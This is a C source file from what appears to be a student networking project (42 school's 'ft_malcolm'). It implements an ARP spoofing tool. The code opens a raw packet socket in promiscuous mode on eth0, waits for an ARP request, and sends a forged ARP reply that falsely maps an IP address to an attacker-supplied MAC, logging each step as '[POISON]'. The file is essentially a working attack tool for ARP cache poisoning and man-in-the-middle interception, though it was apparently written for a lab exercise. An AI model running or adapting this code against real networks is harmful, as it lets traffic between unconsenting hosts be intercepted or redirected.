/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   malcolm.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: nicolas <nicolas@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/11/04 18:38:53 by nponchon          #+#    #+#             */
/*   Updated: 2025/11/20 16:53:50 by nicolas          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../incs/ft_malcolm.h"

extern int g_sigint;

void	forge_arp(struct ether_arp *original_arp, t_malcolm *m)
{
	struct ether_arp forged_arp;

	ft_memcpy(&forged_arp, original_arp, sizeof(struct ether_arp));
	forged_arp.ea_hdr.ar_op = htons(ARPOP_REPLY);

	sscanf(m->source_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
		&forged_arp.arp_sha[0], &forged_arp.arp_sha[1], &forged_arp.arp_sha[2],
		&forged_arp.arp_sha[3], &forged_arp.arp_sha[4], &forged_arp.arp_sha[5]);
	inet_pton(AF_INET, m->source_ip, forged_arp.arp_spa);

	sscanf(m->target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
		&forged_arp.arp_tha[0], &forged_arp.arp_tha[1], &forged_arp.arp_tha[2],
		&forged_arp.arp_tha[3], &forged_arp.arp_tha[4], &forged_arp.arp_tha[5]);
	inet_pton(AF_INET, m->target_ip, forged_arp.arp_tpa);

	printf("Forged ARP reply:\n");
	printf("  Sender MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
		forged_arp.arp_sha[0], forged_arp.arp_sha[1], forged_arp.arp_sha[2],
		forged_arp.arp_sha[3], forged_arp.arp_sha[4], forged_arp.arp_sha[5]);
	printf("  Sender IP: %s\n", m->source_ip);
	printf("  Target MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
		forged_arp.arp_tha[0], forged_arp.arp_tha[1], forged_arp.arp_tha[2],
		forged_arp.arp_tha[3], forged_arp.arp_tha[4], forged_arp.arp_tha[5]);
	printf("  Target IP: %s\n", m->target_ip);
	printf("  Operation: ARP Reply\n");

}

#include <sys/ioctl.h>
void	send_arp(t_malcolm *m, unsigned char *buf)
{
	(void)buf; // Unused parameter for now

	int ifindex = if_nametoindex("eth0");
	if (ifindex == 0) {
		fprintf(stderr, "if_nametoindex failed");
		return;
	}

	unsigned char src_mac[6];
	sscanf(m->source_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
		&src_mac[0], &src_mac[1], &src_mac[2], &src_mac[3], &src_mac[4], &src_mac[5]);

	//unsigned char broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	unsigned char broadcast_mac[6];
	sscanf(m->target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
		&broadcast_mac[0], &broadcast_mac[1], &broadcast_mac[2],
		&broadcast_mac[3], &broadcast_mac[4], &broadcast_mac[5]);

	struct ether_header eth;
	ft_memcpy(eth.ether_shost, src_mac, 6);
	ft_memcpy(eth.ether_dhost, broadcast_mac, 6);
	eth.ether_type = htons(ETH_P_ARP);

	struct ether_arp arp;
	arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
	arp.ea_hdr.ar_pro = htons(ETH_P_IP);
	arp.ea_hdr.ar_hln = 6;
	arp.ea_hdr.ar_pln = 4;
	arp.ea_hdr.ar_op  = htons(ARPOP_REPLY);
	ft_memcpy(arp.arp_sha, src_mac, 6);
	inet_pton(AF_INET, m->source_ip, arp.arp_spa);
	// For gratuitous ARP: target is same as source (self-announcement)
	ft_memcpy(arp.arp_tha, src_mac, 6);
	inet_pton(AF_INET, m->source_ip, arp.arp_tpa);

	unsigned char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
	ft_memcpy(packet, &eth, sizeof(eth));
	ft_memcpy(packet + sizeof(eth), &arp, sizeof(arp));

	struct sockaddr_ll sll = {0};
	sll.sll_ifindex = ifindex;
	sll.sll_halen = 6;
	ft_memcpy(sll.sll_addr, broadcast_mac, 6);

	printf("[POISON] Sending gratuitous ARP: '%s is at %s'\n", m->source_ip, m->source_mac);

	ssize_t bytes_sent = sendto(m->socket, packet, sizeof(packet), 0, (struct sockaddr*)&sll, sizeof(sll));
	if (bytes_sent < 0) {
		fprintf(stderr, "Error: sendto failed\n");
	} else {
		printf("[POISON] Successfully sent (%zd bytes)\n", bytes_sent);
	}
}

int	listen_arp(t_malcolm *m)
{
    m->socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));	// ETH_P_ARP to capture ARP packets only
    if (m->socket < 0) {
	    fprintf(stderr, "Error: unable to create raw socket\n");
	    return (free_malcolm(m), 1);
    }

	if (setsockopt(m->socket, SOL_SOCKET, SO_BINDTODEVICE, "eth0", strlen("eth0")) < 0) {
        perror("setsockopt SO_BINDTODEVICE failed");
        return (free_malcolm(m), 1);
    }

	// This might not be necessary since we need to send a reply at the first ARP request, ie. ignore container B's reply.
    struct packet_mreq mreq = {0};
    mreq.mr_ifindex = if_nametoindex("eth0");
    mreq.mr_type = PACKET_MR_PROMISC;	// set promiscuous mode to capture also non-broadcast packets, eg. unicast ARP replies 
    setsockopt(m->socket, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mreq, sizeof(mreq));

    unsigned char buf[65536];
    struct sockaddr_ll addr;
    socklen_t addrlen = sizeof(addr);

    printf("Starting to listen for packets between A and B...\n");

    while (g_sigint == 0) {
        ssize_t len = recvfrom(m->socket, buf, sizeof(buf), 0,
                            (struct sockaddr*)&addr, &addrlen);
        if (len < 0)
			continue;

        struct ether_header *eth = (struct ether_header*)buf;
        if (ntohs(eth->ether_type) == ETH_P_ARP) 
			break;
    }

	print_arp(buf);
	sleep(1);
	send_arp(m, buf);

    return (0);
}
